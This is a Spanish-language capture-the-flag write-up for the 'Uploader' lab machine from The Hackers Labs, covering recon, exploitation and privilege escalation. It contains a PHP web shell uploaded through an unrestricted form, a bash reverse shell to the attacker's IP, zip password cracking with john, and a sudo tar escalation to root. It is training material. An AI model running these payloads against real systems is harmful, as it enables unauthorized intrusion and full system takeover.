
# Writeup Template: Maquina `[ Uploader ]`

- Tags: #Uploader
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.25
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.25 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.25
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.25 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.25 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 192.168.100.25 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNobe))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.25
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.25 # No reporta nada relevante
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://192.168.100.25 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x php,php.back,backu,txt,sh,html,js,java,py,zip
```

- **Hallazgos**:
```bash
===============================================================
/index.html           (Status: 200) [Size: 3968]
/uploads              (Status: 301) [Size: 318] [--> http://192.168.100.25/uploads/]
/upload.php           (Status: 200) [Size: 3277]
```

### Descubrimiento de Subdominios
```bash
wfuzz -c -w [Diccionario] -H "Host:FUZZ.Aqui la URL" -u [IP_Objetivo]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemso este ruta donde podemos subir archivos, No indica que tipo de archivos acepta, Asi que probaremos intentando subir archivos php nos permista realizar una llamada a nivel de sistema para ejecutar comandos
En caso de que no este sanitizada, Lograremos ejecutar comandos en el servidor, y en caso de que tenga validaciones, Intentaremos **ByPassear** esas medidas de seguridad
```bash
http://192.168.100.25/upload.php
```

Creamos este archivo malicioso en php, **shell.php**
```php
<?php
  system($_GET["cmd"]);
?>
```

Una ves cargado nuestro archivo vemos que si nos deja subirlo ya que al darle al boton de: **( Subri a la nube )** se ha subido con exito, 
Ahora revisando la ruta donde se cargan los archivos que subamos, Tenemos lo siguiente
```bash
# Aqui esta nuestro archivo shell.php
http://192.168.100.25/uploads/cloud_9d0c2f/
```

Tenemos que ver si logramos ejecutar comandos, en el objetivo,
### Ejecucion del Ataque
Tenemos **RCE** en el objetivo, Logramos ejecucion de comandos
```bash
# Comandos para explotación
http://192.168.100.25/uploads/cloud_9d0c2f/shell.php?cmd=whoami
```

En la respuesta del servidor tenemos lo siguiente:
```bash
www-data
```

### Intrusion
Ahroa nos ponemos en Modo escucha para ganar acceso al objetivo
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
192.168.100.25/uploads/cloud_9d0c2f/shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/192.168.100.26/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion Usuarios
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
operatorx:x:1000:1000:operator:/home/operatorx:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Listando el directorio **home** tenemos lo siguiente:
```bash
ls -la /home

-rw-r--r--  1 root      root        66 Aug 19 21:49 Readme.txt
```

Si leemos su contenido:
```bash
He guardado mi archivo zip más importante en un lugar secreto.  
```

Por lo que necesitamos encontrar un archivo comprimido,  Para encontrarlo ejecutamos el siguiente comando
```bash
find / -type f -iname "*.zip" -user root -ls 2>/dev/null
```

Resultado:
```bash
262155      4 -rw-r--r--   1 root     root          430 Aug 18 22:28 /srv/secret/File.zip
```

Tenemos que transferirnos a nuestra maquina de atacante este archivo, y vemos que existe el binario de python en la maquina victima
```bash
which python3

/usr/bin/python3
```

Montamos un servidor web en la ruta donde se encuentra ese archivo comprimido
```bash
www-data@TheHackersLabs-Operator:/srv/secret$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Ahora desde nuestra maquina atacante, Realizamos la peticion para traernos el comprimido
```bash
wget http://192.168.100.25:8080/File.zip

--2025-08-25 18:19:42--  http://192.168.100.25:8080/File.zip
Connecting to 192.168.100.25:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 430 [application/zip]
Saving to: ‘File.zip’

File.zip                                                    

2025-08-25 18:19:42 (778 KB/s) - ‘File.zip’ saved [430/430]
```

Ahora que lo tenemos en nuestra maquina es seguro que tenga contrasena, Asi que usamos **john** para obtenerla
```bash
zip2john File.zip > hash
ver 2.0 File.zip/Credentials/ is not encrypted, or stored with non-handled compression type
```

Ahora realizamos el ataque de fuerza bruta para obtener la contrasena
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 64 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
121288           (File.zip/Credentials/Credentials.txt)
```

Ahora si decomprimimos el archivo
```bash
7z x File.zip # 121288
```

Tenemos una carpeta que contiene este archivo, **Credentials.txt** que si revisamos su contenido tenemos lo siguiente:
```bash
File: Credentials.txt
───────────────────────────────────────────
User: operatorx
       
Password: d0970714757783e6cf17b26fb8e2298f
```

Tenemos credenciales validas para el usuario **operatorx**, ASi que nos logueamos como este usuario
Ahora por su longitud es un **hashmd5** usamos este recurso para desemcriptarla [hashdecrypt](https://10015.io/tools/md5-encrypt-decrypt)
```bash
112233 # Contrasena en texto plano
```

Migramos de usuario:
```bash
su operatorx # 112233
```

###### Usuario `[ Operatorx ]`:
Tenemso la flag de usuario
```bash
-rw-r--r-- 1 root      root        33 ago  8 17:43 user.txt
```

Revisando los permsios para este usuario tenemos lo siguente:
```bash
sudo -l 

User operatorx may run the following commands on TheHackersLabs-Operator:
    (ALL) NOPASSWD: /usr/bin/tar
```

Tenemos una via potencial de escalar a **root**
```bash
# Comando para escalar al usuario: ( root )
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

## Evidencia de Compromiso
LIstando la flag de **root**
```bash
ls -la /root

-rw-r--r--  1 root root   33 ago  8 17:45 root.txt
```

```bash
# Captura de pantalla o output final
root@TheHackersLabs-Operator:/home/operatorx# echo -e "\n[+] Hacked: $(whoami)\n"

[+] Hacked: root
```
